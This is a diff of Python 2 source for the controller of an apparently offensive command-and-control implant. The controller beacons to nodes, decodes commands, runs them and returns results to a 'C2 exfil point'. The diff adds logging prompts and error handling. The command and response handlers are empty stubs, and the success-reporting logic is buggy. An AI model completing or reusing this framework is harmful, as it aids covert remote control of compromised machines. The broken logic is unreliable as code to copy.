@@ -7,12 +7,23 @@
 import inspect
 import sys
 import warnings
+from socket import error as socket_error
 
 # TODO:
 #
 # - Parse XML to build mappings
 # - Considering wrapping each node into a Node class upon initial import.
 # - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.
+
+PROMP_SEP = "->"
+PROMP_BASE = "[Controller"
+PROMP_END = "]>"
+BASIC_PROMPT = PROMP_BASE + PROMP_END
+BEAC_PROMPT = PROMP_BASE + PROMP_SEP + 'Beaconer' + PROMP_END
+DEC_PROMPT = PROMP_BASE + PROMP_SEP + 'Decoder' + PROMP_END
+CMD_PROMPT = PROMP_BASE + PROMP_SEP + 'Commander' + PROMP_END
+ENC_PROMPT = PROMP_BASE + PROMP_SEP + 'Encoder' + PROMP_END
+RESP_PROMPT = PROMP_BASE + PROMP_SEP + 'Responder' + PROMP_END
 
 BEACON_TYPE_IND = 0
 PARAMS_IND = 1
@@ -124,8 +135,11 @@ class Controller:
         # [('http_get',{'node':'192.168.2.2','port':'80','path':'/index.html','timeout':'10'})]
         #
         
+        print BEAC_PROMPT + " beaconing..."
+        
         try:
             
+            success = False
             # Should I randomize the order of nodes?
             for node in nodes:
                 beacon_type = node[BEACON_TYPE_IND]
@@ -133,14 +147,17 @@ class Controller:
         
                 beaconer_class = self.beacon_map.get(beacon_type) # get this from the beacon map based on beacon type
                 beaconer = beaconer_class() # instantiate the object
-                success, response = beaconer.beacon(params)
+                try:
+                    success, response = beaconer.beacon(params)
+                except Exception, e:
+                    print "%s Error connecting to %s:%s" % (BEAC_PROMPT, params.get('node'), params.get('port'))
+                    success = False
                 
                 if success:
                     return (success, response)
                 else:
-                    
                     # Should I pause here or just continue?
-                    continue
+                    pass
                 
             # What do I do if none of the nodes worked?
             return (False, None)
@@ -180,6 +197,8 @@ class Controller:
     
     def handle_decode(self, encoded_data):
         
+        print DEC_PROMPT + " decoding..."
+        
         # while there is another decoder, run each item through the next decoder
         data = encoded_data
         success = True
@@ -192,57 +211,58 @@ class Controller:
         return success, data
     
     def handle_command(self, command, params):
+        print CMD_PROMPT + " calling command..."
         pass
     
     def handle_encode(self, results):
+        print ENC_PROMPT + " encoding results..."
         pass
     
     def handle_response(self, encoded_results):
+        print RESP_PROMPT + " sending results..."
         pass
     
     def handle(self, nodes):
         
         try:
-            print "[Controller]> beaconing..."
             # Send command to beacon handler
             success, encoded_data = self.handle_beacon(nodes)
             
-            print "[Controller]> decoding..."
             # Send response to decoders
             if success:
                 success, decoded_data = self.handle_decode(encoded_data)
             else:
-                raise
+                return False 
             
-            print "[Controller]> calling command..."
             # Process command
             if success:
                 command, params = decoded_data
                 success, results = self.handle_command(command, params)
             else:
-                raise
+                return False
             
-            print "[Controller]> encoding results..."
             # encode response here
             if success:
                 success, encoded_results = self.handle_encode(results)
             else:
-                raise
+                return False
             
-            print "[Controller]> sending results..."
             # Send response
             if success:
                 success = self.handle_response(encoded_results)
             else:
-                raise
+                return False
+            
         
         except Exception, e:
             # Here consider sending back a message to the C2 exfil point, letting them know why the implant died
+            # if so, replace the return statements with raise statements and define appropriate exceptions with mesages
             raise e
             
     
     def beacon(self, nodes):
         # facade
-        self.handle(nodes)
+        result = self.handle(nodes)
+        print "%s Beaconing iteration %s" % (BASIC_PROMPT,("FAILED", "SUCCEEDED")[result]) 
     
     
